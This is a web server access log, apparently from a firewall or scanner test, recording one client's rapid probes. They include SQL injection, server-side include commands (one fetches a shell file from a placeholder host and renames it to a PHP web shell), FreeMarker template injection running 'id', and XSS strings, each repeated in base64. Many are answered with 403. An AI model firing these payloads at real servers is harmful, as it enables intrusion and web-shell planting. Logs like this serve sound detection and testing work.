127.0.0.1 - - [24/Dec/2025:18:38:37 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:42:34 +0000] "GET /-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:34 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:34 +0000] "GET /?2695bbda9a=-1134%27%29%20%20OR%20JSON_EXTRACT%28%27%7B%27%27aKER%27%27:%209648%7D%27%2C%20%27$.aKER%27%29%20=%209648%2A7799%20AND%20%28%27QlYa%27%20LIKE%20%27QlYa HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "GET /MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "GET /?332b76efb3=MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "GET / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:35 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "GET /?d64ef24460=123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "GET /123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "GET /?dfe8384849=PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:36 +0000] "GET /PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "GET /%3C%21--%23exec%20cmd=%22wget%20http:%2F%2Fsome_host%2Fshell.txt%20%7C%20rename%20shell.txt%20shell.php%22--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "GET /?c7347a5c68=%3C%21--%23exec%20cmd=%22wget%20http:%2F%2Fsome_host%2Fshell.txt%20%7C%20rename%20shell.txt%20shell.php%22--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "GET /PCEtLSNleGVjIGNtZD0ibHMiIC0tPg HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:37 +0000] "GET /?23d9927560=PCEtLSNleGVjIGNtZD0ibHMiIC0tPg HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "GET /%3C%21--%23exec%20cmd=%22ls%22%20--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "GET /?1268962836=%3C%21--%23exec%20cmd=%22ls%22%20--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "GET /?665cc75cdd=PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:38 +0000] "GET /PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "GET /%3C%21--%23exec%20cmd=%22dir%22%20--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "GET /?f07116de4b=%3C%21--%23exec%20cmd=%22dir%22%20--%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "GET /PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:39 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "GET /?207c6c1192=PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "GET /?bb09523033=%3C%23assign%20ex%20=%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E$%7B%20ex%28%22id%22%29%7D HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "GET /%3C%23assign%20ex%20=%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E$%7B%20ex%28%22id%22%29%7D HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "GET /YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:40 +0000] "GET /?cce501106c=YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "GET /aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "GET /?a6da077b81=aaaa%5Cu0027%252b%23%7B16%2A8787%7D%252b%5Cu0027bbb HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "GET /e3sxMzM3KjEzMzh9fQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "GET /?08ffa3ce1e=e3sxMzM3KjEzMzh9fQ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "POST / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "GET /%7B%7B1337%2A1338%7D%7D HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "GET /?fa1c4c01cf=%7B%7B1337%2A1338%7D%7D HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
127.0.0.1 - - [24/Dec/2025:18:42:42 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "GET /?3895ec94ea=PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "POST / HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:43 +0000] "GET /PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "GET /?298a0da2f4=%3Cbody%20onload=alert%28%27test1%27%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "GET /%3Cbody%20onload=alert%28%27test1%27%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "GET /PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:44 +0000] "GET /?910a71d8c2=PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "GET /%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "GET /?01811b93ac=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "GET /?55d91da06c=Im9ud2hlZWw9ZWFkKDExMSk HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:42:45 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
